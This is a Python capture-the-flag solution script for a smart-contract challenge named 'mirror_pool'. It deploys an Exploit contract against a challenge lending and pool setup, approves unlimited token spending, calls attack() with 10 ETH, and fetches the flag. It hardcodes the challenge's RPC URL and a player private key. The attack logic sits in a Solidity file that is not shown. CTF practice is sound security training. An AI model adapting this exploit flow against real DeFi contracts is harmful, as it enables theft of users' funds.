#!/usr/bin/env python3
import time
import requests
import solcx
from web3 import Web3
from eth_account import Account

RPC_URL = "https://web-692a522622f0bded.web.h7tex.com"
CHAIN_ID = 31337
PRIVATE_KEY = "0xbb0e6051206f9fdd680c2e453b76c32b358165fe610e5c86476dfa00e12dc9ed"
SETUP_ADDR = "0x3054ca833E6c4FeE63896B2bf78064A59c64bdf5"

def main():
    print("[*] Connecting to Web3 RPC:", RPC_URL)
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"

    account = Account.from_key(PRIVATE_KEY)
    player = account.address
    print(f"[+] Player address: {player}")
    print(f"[+] Player ETH balance: {w3.from_wei(w3.eth.get_balance(player), 'ether')} ETH")

    print("[*] Compiling contracts...")
    compiled = solcx.compile_files(
        [
            "solutions/mirror_pool/IERC20.sol",
            "solutions/mirror_pool/Token.sol",
            "solutions/mirror_pool/Pool.sol",
            "solutions/mirror_pool/MirrorLend.sol",
            "solutions/mirror_pool/Setup.sol",
            "solutions/mirror_pool/Exploit.sol"
        ],
        solc_version="0.8.24",
        output_values=["abi", "bin"]
    )

    setup_abi = compiled["solutions/mirror_pool/Setup.sol:Setup"]["abi"]
    setup = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)

    token_addr = setup.functions.token().call()
    pool_addr = setup.functions.pool().call()
    lend_addr = setup.functions.lend().call()
    print(f"[+] Token: {token_addr}")
    print(f"[+] Pool:  {pool_addr}")
    print(f"[+] Lend:  {lend_addr}")
    print(f"[*] Initial isSolved: {setup.functions.isSolved().call()}")

    token_abi = compiled["solutions/mirror_pool/Token.sol:Token"]["abi"]
    token = w3.eth.contract(address=token_addr, abi=token_abi)
    player_tokens = token.functions.balanceOf(player).call()
    print(f"[+] Player token balance: {w3.from_wei(player_tokens, 'ether')} mUSD")

    # Step 1: Deploy Exploit contract
    print("[*] Deploying Exploit contract...")
    exploit_interface = compiled["solutions/mirror_pool/Exploit.sol:Exploit"]
    exploit_contract = w3.eth.contract(abi=exploit_interface["abi"], bytecode=exploit_interface["bin"])
    
    nonce = w3.eth.get_transaction_count(player)
    deploy_tx = exploit_contract.constructor(SETUP_ADDR).build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 3_000_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": CHAIN_ID
    })
    signed_tx = w3.eth.account.sign_transaction(deploy_tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    exploit_addr = receipt.contractAddress
    print(f"[+] Exploit deployed at: {exploit_addr}")

    # Step 2: Approve Exploit to spend all player tokens
    print("[*] Approving Exploit to spend player tokens...")
    nonce += 1
    approve_tx = token.functions.approve(exploit_addr, 2**256 - 1).build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 100_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": CHAIN_ID
    })
    signed_tx = w3.eth.account.sign_transaction(approve_tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("[+] Approval confirmed")

    # Step 3: Call exploit.attack{value: 10 ether}()
    print("[*] Executing attack() with 10 ETH...")
    exploit = w3.eth.contract(address=exploit_addr, abi=exploit_interface["abi"])
    nonce += 1
    attack_tx = exploit.functions.attack().build_transaction({
        "from": player,
        "value": w3.to_wei(10, "ether"),
        "nonce": nonce,
        "gas": 3_000_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": CHAIN_ID
    })
    signed_tx = w3.eth.account.sign_transaction(attack_tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Attack tx confirmed! Gas used: {receipt.gasUsed}")

    # Step 4: Verify isSolved()
    solved = setup.functions.isSolved().call()
    print(f"[+] Setup.isSolved(): {solved}")

    # Step 5: Fetch flag from web server
    if solved:
        print("[*] Fetching flag from https://web-692a522622f0bded.web.h7tex.com/flag ...")
        resp = requests.get("https://web-692a522622f0bded.web.h7tex.com/flag")
        print(f"[+] Server response ({resp.status_code}):\n{resp.text}")
    else:
        print("[-] Challenge not marked as solved yet.")

if __name__ == "__main__":
    main()
